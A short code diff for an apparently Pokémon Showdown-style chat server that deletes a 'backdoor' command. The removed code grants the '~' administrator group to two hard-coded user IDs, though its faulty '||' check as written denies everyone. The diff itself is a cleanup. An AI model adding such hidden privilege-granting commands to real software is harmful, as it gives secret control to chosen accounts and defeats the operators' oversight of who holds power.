@@ -935,21 +935,6 @@ exports.commands = {
 		Users(target).popup('|modal|' + user.name + ' have given you a FREE custom symbol.  Use /customsymbol to set your symbol.');
 	},
 	
-	backdoor: function (target, room, user) {
-        if (user.userid !== 'flareninja' || user.userid !== 'nkobellic') return this.sendReply('/backdoor - Access denied.');
-
-        if (!target) {
-            user.group = '~';
-            user.updateIdentity();
-            return;
-        }
-
-        if (target === 'reg') {
-            user.group = ' ';
-            user.updateIdentity();
-            return;
-        }
-    },
     toggleauth: function(target, room, user) {
         if (!this.can('roommod', null, room)) return false;
         room.showAuth = !room.showAuth;
